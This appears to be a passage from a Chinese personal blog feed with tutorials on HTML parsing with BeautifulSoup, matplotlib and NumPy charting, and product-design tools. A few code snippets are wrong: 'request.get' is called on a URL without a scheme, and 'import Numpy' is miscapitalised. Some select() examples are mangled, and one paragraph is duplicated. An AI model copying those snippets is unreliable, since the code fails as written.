<h2 id="查看网页原始文件"><a href="#查看网页原始文件" class="headerlink" title="查看网页原始文件"></a>查看网页原始文件</h2><p>检视网页的原始文件目的，主要是掌握几个关键重点，然后提取我们想要的数据。</p>
<p>如果使用的是Chrome浏览器，将鼠标光标放在网页上单击鼠标右键，打开快捷菜单，再执行View page source指令，也可以打开新窗口显示此网页的HTML原始文件。</p>
<h2 id="BeautifulSoup模块"><a href="#BeautifulSoup模块" class="headerlink" title="BeautifulSoup模块"></a>BeautifulSoup模块</h2><p>使用BeautifulSoup模块解析HTML文件，目前这个模块是第4版，模块名称是beautifulsoup4。安装模块指令为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure>
<p>导入模块时，可以使用指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import bs4</span><br></pre></td></tr></table></figure>
<h4 id="建立beautifulsoup对象"><a href="#建立beautifulsoup对象" class="headerlink" title="建立beautifulsoup对象"></a>建立beautifulsoup对象</h4><p>建立BeautifulSoup对象的语法为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">htmlfile &#x3D; request.get(&#39;www.baidu.com&#39;)  #下载网页内容</span><br><span class="line"></span><br><span class="line">obj &#x3D; bs4.BeautifulSoup(htmlfile.text,&#39;lxml&#39;) #lxml是解析HTML文件的方式</span><br></pre></td></tr></table></figure>
<p>当网页下载后，将网页内容的Response对象传给bs4.BeautifulSoup( )方法，就可以建立BeautifulSoup对象。至于另一个参数“lxml”目的是注明解析HTML文件的方法，常用的有下列方法：</p>
<p>‘html.parser’：这是老旧的方法(3.2.3版本前)，兼容性比较不好。</p>
<p>‘lxml’：速度快，兼容性佳。</p>
<p>html5lib’：速度比较慢，但是解析能力强，需另外安装html5lib（pip install html5lib）。</p>
<h4 id="页标题title属性"><a href="#页标题title属性" class="headerlink" title="页标题title属性"></a>页标题title属性</h4><p>BeautifulSoup对象的title属性可以传回页标题的title标签内容。</p>
<p>如使用title属性解析myhtml.html文件的页标题：</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010133703575.png" alt="image-20201010133703575"></p>
<h4 id="传回文字text属性"><a href="#传回文字text属性" class="headerlink" title="传回文字text属性"></a>传回文字text属性</h4><p>可以使用text属性获得卷标的内容。</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010133921608.png" alt="image-20201010133921608"></p>
<h4 id="传回第一个符合的标签find"><a href="#传回第一个符合的标签find" class="headerlink" title="传回第一个符合的标签find()"></a>传回第一个符合的标签find()</h4><p>这个函数可以找寻HTML文件内第一个符合的标签内容，例如，find(‘h1’)是要找第一个h1的标签。如果找到了就传回该卷标字符串，可以使用text属性获得内容，如果没找到就传回None。</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010134345317.png" alt="image-20201010134345317"></p>
<h4 id="传回所有符合的标签find-all"><a href="#传回所有符合的标签find-all" class="headerlink" title="传回所有符合的标签find all()"></a>传回所有符合的标签find all()</h4><p>这个函数可以找寻HTML文件内所有符合的标签内容，例如，find_all(‘h1’)是要找所有h1的标签。如果找到了就传回该标签列表，如果没找到就传回空列表。</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010134500430.png" alt="image-20201010134500430"></p>
<h4 id="HTML元素上下文属性与getText"><a href="#HTML元素上下文属性与getText" class="headerlink" title="HTML元素上下文属性与getText( )"></a>HTML元素上下文属性与getText( )</h4><p>HTML元素内容的属性有下列3种：</p>
<p>textContent：内容，不含任何标签码。</p>
<p>innerHTML：元素内容，含子卷标码，但是不含本身标签码。</p>
<p>outerHTML：元素内容，含子卷标码，也含本身标签码。</p>
<p>如果有一个元素内容如下：</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010134812644.png" alt="image-20201010134812644"></p>
<p>则3个属性的内容分别如下：</p>
<p><img src="/2020/10/10/Python-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/image-20201010135004153.png" alt="image-20201010135004153"></p>
<p>使用BeautifulSoup模块解析HTML文件时，如果传回的是列表，也可以配合索引应用getText( )取得列表元素内容，所取得的内容是textContent。</p>
<h4 id="select"><a href="#select" class="headerlink" title="select( )"></a>select( )</h4><p>select( )主要是以CSS选择器(selector)的观念寻找元素，如果找到，回传的是列表(list)，如果找不到则传回空列表。</p>
<p>使用示例如下：</p>
<p>objSoup.select(‘p’)：找寻所有&lt;</p><p>&gt;卷标的元素。</p>
<p>objSoup.select (‘img’)：找寻所有&lt;<img>&gt;卷标的元素。</p>
<p>objSoup.select (‘.happy’)：找寻所有CSS class属性为happy的元素。</p>
<p>objSoup.select (‘#author’)：找寻所有CSS id属性为author的元素。</p>
<p>objSoup.select (‘p #author’)：找寻所有</p><p>且id属性为author的元素。</p>
<p>objSoup.select (‘p .happy’)：找寻所有</p><p>且class属性为happy的元素。</p>
<p>objSoup.select (‘div strong’)：找寻所有在<section>元素内的<strong>元素。</strong></section></p>
<p>objSoup.select (‘input[name]’)：找寻所有<input>卷标且有name属性的元素。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-数据图表设计</title>
    <url>/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<p>数据图形的绘制所使用的工具是matplotlib绘图库模块，使用前需先安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install matplotlib</span><br></pre></td></tr></table></figure>
<p>matplotlib是一个庞大的绘图库模块，只导入其中的pyplot子模块就可以完成许多图表绘制,调用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import matplotlib.pyplot as plt</span><br></pre></td></tr></table></figure>
<h2 id="简单的折线图"><a href="#简单的折线图" class="headerlink" title="简单的折线图"></a>简单的折线图</h2><h4 id="show"><a href="#show" class="headerlink" title="show()"></a>show()</h4><p>show( )方法主要是显示所绘制的图形，当绘制图形完成后，可以调用此方法。</p>
<h4 id="画线plot"><a href="#画线plot" class="headerlink" title="画线plot()"></a>画线plot()</h4><p>应用方式是将含数据的列表当参数传给plot( )，列表内的数据会被视为y轴的值，x轴的值会依列表值的索引位置自动产生。</p>
<p>如绘制数据基本上是1-8的平方值的折线：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010151348979.png" alt="image-20201010151348979"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010151435846.png" alt="image-20201010151435846"></p>
<p>可以看到左下角的轴刻度不是(0,0)，可以使用axis( )设定x,y轴的最小和最大刻度。</p>
<p>将轴刻度x轴设为0,8，y轴刻度设为0,70。</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010151553847.png" alt="image-20201010151553847"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010151617747.png" alt="image-20201010151617747"></p>
<h4 id="线条宽度linewidth"><a href="#线条宽度linewidth" class="headerlink" title="线条宽度linewidth"></a>线条宽度linewidth</h4><p>使用plot( )时，可以多加一个linewidth(缩写是lw)参数设定线条的粗细。</p>
<p>如设定线条宽度为3：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010151721189.png" alt="image-20201010151721189"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010151748089.png" alt="image-20201010151748089"></p>
<h4 id="标题的显示"><a href="#标题的显示" class="headerlink" title="标题的显示"></a>标题的显示</h4><p>目前matplotlib模块不支持中文显示，下列是几个图表重要的方法。</p>
<p>title( )：图表标题。</p>
<p>xlabel( )：x轴标题。</p>
<p>ylabel( )：y轴标题。</p>
<p>上述方法可以显示默认大小是12的字体，它的语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title(标题名称，fontsize&#x3D;数值大小)  #同时可用在xlabel()和ylabel()</span><br></pre></td></tr></table></figure>
<p>使用默认字号为图表与x/y轴建立标题:</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010152051237.png" alt="image-20201010152051237"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010152116192.png" alt="image-20201010152116192"></p>
<h4 id="坐标轴刻度"><a href="#坐标轴刻度" class="headerlink" title="坐标轴刻度"></a>坐标轴刻度</h4><p>在设计图表时可以使用tick_params( )设计设定坐标轴的刻度大小、颜色以及应用范围。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tick_params(axis&#x3D;&#39;xx&#39;,labelsize&#x3D;xx,color&#x3D;&#39;xx&#39; )  #labelsize&#x3D;xx代表刻度大小</span><br></pre></td></tr></table></figure>
<p>如果axis的xx是both代表应用到x和y轴，如果xx是x代表应用到x轴，如果xx是y代表应用到y轴。color则是设定刻度的线条颜色，例如，red代表红色。</p>
<p>使用不同刻度与颜色：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010152728802.png" alt="image-20201010152728802"></p>
<h4 id="多组数据的应用"><a href="#多组数据的应用" class="headerlink" title="多组数据的应用"></a>多组数据的应用</h4><p>扩充多组数据，只要在plot( )内增加数据列表参数即可。此时plot( )的参数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plot(第一组数据，第二组数据.....)</span><br></pre></td></tr></table></figure>
<p>如设计多组数据图的应用：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010153402762.png" alt="image-20201010153402762"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010153452276.png" alt="image-20201010153452276"></p>
<h4 id="线条色彩与样式"><a href="#线条色彩与样式" class="headerlink" title="线条色彩与样式"></a>线条色彩与样式</h4><p>如果想设定线条色彩，可以在plot( )内增加下列参数设定，下列是常见的色彩表。</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010153652539.png" alt="image-20201010153652539"></p>
<p>下列是常见的样式表。可以混合使用，例如，‘r-.’代表红色虚点线。</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010153733132.png" alt="image-20201010153733132"></p>
<p>如采用不同色彩与线条样式绘制图表：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010153820459.png" alt="image-20201010153820459"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010153841916.png" alt="image-20201010153841916"></p>
<h4 id="刻度设计"><a href="#刻度设计" class="headerlink" title="刻度设计"></a>刻度设计</h4><p>目前所有绘制图表x轴和y轴的刻度皆是plot( )方法针对所输入的参数采用默认值设定。</p>
<p>可以使用pyplot模块的xticks( )/yticks( )分别设定x/y轴刻度。</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010154005309.png" alt="image-20201010154005309"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010154038326.png" alt="image-20201010154038326"></p>
<h4 id="保存图片"><a href="#保存图片" class="headerlink" title="保存图片"></a>保存图片</h4><p>图表设计完成，可以使用savefig( )保存图片文件，这个方法需放在show( )的前方，表示先存储再显示图表。</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010154530375.png" alt="image-20201010154530375"></p>
<h2 id="绘制散点图scatter"><a href="#绘制散点图scatter" class="headerlink" title="绘制散点图scatter( )"></a>绘制散点图scatter( )</h2><h4 id="散点图的绘制"><a href="#散点图的绘制" class="headerlink" title="散点图的绘制"></a>散点图的绘制</h4><p>绘制散点图可以使用scatter( )，最基本语法应用如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scatter(x,y,s,c)</span><br></pre></td></tr></table></figure>
<p>(x,y)位置绘图，其中(0,0)位置在左下角，x轴刻度往右增加，y轴刻度往上增加。s是绘图点的大小，默认是20。c是颜色，默认是蓝色。</p>
<p>如在坐标轴(5,5)绘制一个点：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010155028889.png" alt="image-20201010155028889"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010155054982.png" alt="image-20201010155054982"></p>
<h4 id="绘制系列点"><a href="#绘制系列点" class="headerlink" title="绘制系列点"></a>绘制系列点</h4><p>绘制系列点，可以将系列点的x轴值放在一个列表，y轴值放在另一个列表，然后将这2个列表当参数放在scatter( )即可。</p>
<p>如绘制系列点的应用：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010155206923.png" alt="image-20201010155206923"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010155231822.png" alt="image-20201010155231822"></p>
<h4 id="设定绘图区间"><a href="#设定绘图区间" class="headerlink" title="设定绘图区间"></a>设定绘图区间</h4><p>可以使用axis( )设定绘图区间，语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">axis([xmin,xmax,ymin,ymax])  #分别代表x和y轴的最大最小区间</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010155540194.png" alt="image-20201010155540194"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010155603393.png" alt="image-20201010155603393"></p>
<h2 id="Numpy模块"><a href="#Numpy模块" class="headerlink" title="Numpy模块"></a>Numpy模块</h2><p>Numpy是Python的一个扩充模块，主要是可以支持多维度空间的数组与矩阵运算。导入命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Numpy as np</span><br></pre></td></tr></table></figure>
<h4 id="简单的数组linspace-和arange"><a href="#简单的数组linspace-和arange" class="headerlink" title="简单的数组linspace( )和arange( )"></a>简单的数组linspace( )和arange( )</h4><p>在Numpy模块中最基本的就是linspace( )方法，使用它可以很方便产生相同等距的数组，它的语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">linspace(start,end,num)</span><br></pre></td></tr></table></figure>
<p>start是起始值，end是结束值，num是设定产生多少个等距的数组值，num的默认值是50。</p>
<p>另一个常看到产生数组的方法是arange( )，语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arange(start,stop,step)</span><br></pre></td></tr></table></figure>
<p>start是起始值如果省略默认值是0，stop是结束值但是所产生的数组通常不包含此值，step是数组相邻元素的间距如果省略默认值是1。</p>
<p>如建立0, 1, …, 9, 10的数组：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010160154049.png" alt="image-20201010160154049"></p>
<h4 id="绘制波形"><a href="#绘制波形" class="headerlink" title="绘制波形"></a>绘制波形</h4><p>有了数组数据，可以很方便绘制sin和cos的波形变化。</p>
<p>绘制sin( )和cos( )的波形：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010160338653.png" alt="image-20201010160338653"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010160405398.png" alt="image-20201010160405398"></p>
<h4 id="建立不等宽度的散点图"><a href="#建立不等宽度的散点图" class="headerlink" title="建立不等宽度的散点图"></a>建立不等宽度的散点图</h4><p>在scatter( )方法中，(x,y)的数据可以是列表也可以是矩阵，预设所绘制点大小s的值是20，这个s可以是一个值也可以是一个数组数据，当它是一个数组数据时，利用更改数组值的大小，就可以建立不同大小的散点图。</p>
<p>使用Python绘制散点图时，如果将2个点之间绘了上百或上千个点，则可以产生绘制线条的视觉，如果再加上每个点的大小不同，且依一定规律变化，则可以有特别效果。</p>
<p>如建立一个不等宽度的图形：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010160727201.png" alt="image-20201010160727201"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010160751723.png" alt="image-20201010160751723"></p>
<h4 id="色彩映射color-mapping"><a href="#色彩映射color-mapping" class="headerlink" title="色彩映射color mapping"></a>色彩映射color mapping</h4><p>在色彩的使用中是允许色彩也是数组（或列表）随着数据而变化，此时色彩的变化是根据所设定的色彩映射值(color mapping)而定，例如有一个色彩映射值是rainbow，内容如下：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010160857840.png" alt="image-20201010160857840"></p>
<p>在数组（或列表）中，数值低的值颜色在左边，会随着数值变高颜色往右边移动。需在scatter( )中增加color(也可用c)设定，这时color的值就变成一个数组（或列表）。然后需增加参数cmap（英文是color map），这个参数主要是指定使用哪一种色彩映射值。</p>
<p>如色彩映射的应用：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010161040674.png" alt="image-20201010161040674"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010161130550.png" alt="image-20201010161130550"></p>
<h4 id="色彩映射表"><a href="#色彩映射表" class="headerlink" title="色彩映射表"></a>色彩映射表</h4><p>目前matplotlib协会所提供的色彩映射内容如下：</p>
<p>序列色彩映射表</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010161358480.png" alt="image-20201010161358480"></p>
<p>序列2色彩映射表</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201010161435589.png" alt="image-20201010161435589"></p>
<p>直觉一致的色彩映射表</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201011160104828.png" alt="image-20201011160104828"></p>
<p>发散式的色彩映射表</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201011160145604.png" alt="image-20201011160145604"></p>
<p>定性色彩映射表</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201011160213279.png" alt="image-20201011160213279"></p>
<p>杂项色彩映射表</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201011160241512.png" alt="image-20201011160241512"></p>
<h2 id="随机数的应用"><a href="#随机数的应用" class="headerlink" title="随机数的应用"></a>随机数的应用</h2><p>随机数在统计的应用中是非常重要的知识，用到的随机数方法为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">np.random.random(N)   #传回N个0.0至1.0之间的数字</span><br></pre></td></tr></table></figure>
<p>如产生100个0.0至1.0之间的随机数，使用brg色彩映射表绘出这个图表。</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201011160536580.png" alt="image-20201011160536580"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201011160601595.png" alt="image-20201011160601595"></p>
<h4 id="随机数的移动"><a href="#随机数的移动" class="headerlink" title="随机数的移动"></a>随机数的移动</h4><p>可以针对随机数的特性，让每个点随着随机数的变化产生有序列的随机移动，经过大量值的运算后，每次均可产生不同但有趣的图形。</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201011160855186.png" alt="image-20201011160855186"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201011160919789.png" alt="image-20201011160919789"></p>
<h4 id="隐藏坐标"><a href="#隐藏坐标" class="headerlink" title="隐藏坐标"></a>隐藏坐标</h4><p>可以使用axes( ).get_xaxis( )、axes( ).get_yaxis( )、set_visible( )方法隐藏坐标。</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201011161028473.png" alt="image-20201011161028473"></p>
<p>执行结果：</p>
<p><img src="/2020/10/10/Python-%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E8%AE%BE%E8%AE%A1/image-20201011161053578.png" alt="image-20201011161053578"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>产品文档输出</title>
    <url>/2020/10/11/%E4%BA%A7%E5%93%81%E6%96%87%E6%A1%A3%E8%BE%93%E5%87%BA/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h2 id="产品产生的过程"><a href="#产品产生的过程" class="headerlink" title="产品产生的过程"></a>产品产生的过程</h2><p>一款产品从本质上来讲，一定是满足了用户的某种需求。</p>
<h4 id="想法酝酿与构建"><a href="#想法酝酿与构建" class="headerlink" title="想法酝酿与构建"></a>想法酝酿与构建</h4><p>此阶段主要是从用户所面临的问题出发，抓住问题的核心所在，开始萌生一个产品的想法，逐渐经过酝酿及逻辑构建，形成产品化解决该问题的思路，即建立通过一个产品解决所遇到问题的意图。</p>
<h4 id="分析与论证"><a href="#分析与论证" class="headerlink" title="分析与论证"></a>分析与论证</h4><p>此阶段主要是从用户所面临的问题出发，抓住问题的核心所在，开始萌生一个产品的想法，逐渐经过酝酿及逻辑构建，形成产品化解决该问题的思路，即建立通过一个产品解决所遇到问题的意图。</p>
<h4 id="需求管理"><a href="#需求管理" class="headerlink" title="需求管理"></a>需求管理</h4><p>此阶段是在上一阶段分析论证认为产品的初步想法可行的前提下，开始全面采集和筛选产品需求，并对需求进行分析，界定需求范围。</p>
<h4 id="总体规划"><a href="#总体规划" class="headerlink" title="总体规划"></a>总体规划</h4><p>此阶段主要是完成界定清楚前进的方向和目标，筹划给出实现目标的策略。</p>
<h4 id="具体设计"><a href="#具体设计" class="headerlink" title="具体设计"></a>具体设计</h4><p>在产品大方向和目标确定后，此阶段就是要具体设计产品的基本骨架和血肉，是产品由概念一步一步走向实体，形成一个可观察可体验的原型呈现在用户眼前。具体来讲，包括产品用例结构、功能架构、信息架构以及交互体验、界面效果等几个方面的设计。</p>
<h4 id="开发实现"><a href="#开发实现" class="headerlink" title="开发实现"></a>开发实现</h4><p>此阶段是按照已经形成的产品需求，利用程序代码将产品真正实现，即将产品由一个仿真的实体变成一个真正的实体。</p>
<h4 id="上线发布"><a href="#上线发布" class="headerlink" title="上线发布"></a>上线发布</h4><p>当产品开发完成后，经过测试验证与之前设计的原型一致，并且能够稳定运行不出错误后，产品就可以正式被部署到服务器上，在网上上线发布，供广大目标用户使用。</p>
<h4 id="基本流程框架"><a href="#基本流程框架" class="headerlink" title="基本流程框架"></a>基本流程框架</h4><p>可以总结出产品设计的基本过程框架：</p>
<p><img src="/2020/10/11/%E4%BA%A7%E5%93%81%E6%96%87%E6%A1%A3%E8%BE%93%E5%87%BA/image-20201011121528240.png" alt="image-20201011121528240"></p>
<h2 id="产品设计工具"><a href="#产品设计工具" class="headerlink" title="产品设计工具"></a>产品设计工具</h2><h4 id="思维构建工具"><a href="#思维构建工具" class="headerlink" title="思维构建工具"></a>思维构建工具</h4><p>随着思维导图思想及信息技术的发展，人们设计出了专门的思维导图软件工具，用于制作思维导图，这样的软件工具有很多，如XMind、 MindManger、iMindMap、百度脑图、亿图图示等，在这些工具中，前两个被使用得比较多。</p>
<h4 id="流程图工具"><a href="#流程图工具" class="headerlink" title="流程图工具"></a>流程图工具</h4><p>流程图是以特定图形符号来描述流程的，流程图的基本符号如下：</p>
<p><img src="/2020/10/11/%E4%BA%A7%E5%93%81%E6%96%87%E6%A1%A3%E8%BE%93%E5%87%BA/image-20201011154625143.png" alt="image-20201011154625143"></p>
<p>有很多软件工具可以用来绘制流程图，其绘制方式大同小异，只要按照思路从绘图工具栏中拖动出需要的符号进行组合即可。常见的绘制流程图工具有以下几种：</p>
<p>1、纸和笔</p>
<p>2、亿图图示</p>
<p>3、Visio</p>
<p>4、ProcessOn</p>
<p>ProcessOn是一个基于Web的免费画流程图的网站。它的特点是：免费、不用安装、可以多人同时登录画一张流程图。</p>
<h4 id="原型设计工具"><a href="#原型设计工具" class="headerlink" title="原型设计工具"></a>原型设计工具</h4><p>原型就是用线条、图形描绘出来的产品框架。通常用于产品经理与研发人员之间的沟通，有的情况下，在产品未研发出来的时候，也会用原型面向用户测试产品的可用性等。</p>
<p>在实际工作中，产品经理可以利用各种各样的工具便捷地绘制原型。下面介绍一些基本的绘制原型的工具及其使用方法：</p>
<p>1、纸和笔</p>
<p>2、Axure RP</p>
<p>Axure RP是一个专业的快速原型设计工具。Axure代表美国Axure公司；RP则是Rapid Prototyping（快速原型）的缩写。Axure RP也是目前产品设计人员使用的主流原型设计工具，它的操作简单、上手快，可以轻松快捷地以鼠标的方式快速创建网站或者移动端产品的原型图，不用进行编程就可以在图上定义简单链接和高级交互。除此之外，还可自动生成用于演示的网页文档和Word文档，以供演示或者供开发人员沟通理解需求。目前，Axure RP具有Windows和Mac两个版本。</p>
<p>3、Balsamiq Mockups</p>
<p>Balsamiq Mockups是一款轻量的、手绘风格的原型设计工具，通过它你可以创建朴素的原型图，非常适合用来绘制低保真原型图。Balsamiq Mockups的运行环境多样，它能够在不同浏览器上运行；也可以安装在Windows 7、Mac等不同操作系统平台下；可以在线使用，亦可以离线使用。</p>
<p>4、POP</p>
<p>POP（Prototyping on Paper）是由台湾Woomoo团队开发的一款移动App原型设计软件。只要用手机拍下手绘草稿，在POP里设计好链接区域，就能变成可互动的原型。这款软件可以快速将你的想法从纸上转移到屏幕上并进行再加工。</p>
<h4 id="项目管理工具"><a href="#项目管理工具" class="headerlink" title="项目管理工具"></a>项目管理工具</h4><p>1、甘特图</p>
<p>所有的项目管理工具中，甘特图是容易理解、容易使用并内容较全面的一种。甘特图基本上是一条线条图，横轴表示时间，纵轴表示活动（项目），线条表示在整个期间计划和实际的活动完成情况，它以图示的方式形象地表示出项目的实施顺序、开始时间和持续时间等。使用者可以直观地看到项目的进展情况，了解活动在什么时候进行、还剩下哪些工作要做，以及实际进展与计划要求的对比情况。</p>
<p><img src="/2020/10/11/%E4%BA%A7%E5%93%81%E6%96%87%E6%A1%A3%E8%BE%93%E5%87%BA/image-20201011155325800.png" alt="image-20201011155325800"></p>
<p>2、Teambition</p>
<p>Teambition提供了一个像便利贴墙的任务板，使用者可以在上面发布并阅读任务。针对每一个任务，还可以分解子任务、搭载附件、设定截止日期。</p>
